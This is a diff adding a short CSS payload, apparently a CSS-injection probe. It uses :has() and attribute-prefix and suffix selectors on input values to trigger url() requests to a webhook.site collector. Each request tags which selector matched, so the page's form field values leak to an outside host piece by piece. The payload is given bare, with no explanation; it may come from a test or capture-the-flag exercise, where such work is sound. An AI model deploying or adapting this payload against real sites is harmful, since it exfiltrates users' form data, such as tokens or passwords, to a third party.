@@ -1,0 +1,11 @@
+html:has(input){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=dp");}
+input[value]~input{background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d1");}
+form:has(input[value]){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d2");}
+div.container:has(input[value]){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d3");}
+div.wrapper:has(input[value]){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d4");}
+body:has(input[value]){background-image:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d5");}
+input[value^="r"]~input{border-image-source:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d6");border-style:solid;}
+form:has(input[value$="g"])::after{content:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d7");}
+div.container:has(input[value^="ru"])::before{content:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d8");}
+div.wrapper:has(input[value$="ug"])::after{content:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d9");}
+input[value^="ru"]~input{outline-color:url("https://webhook.site/6e85a813-489c-4879-8561-1e9177793eee?s=d10");}
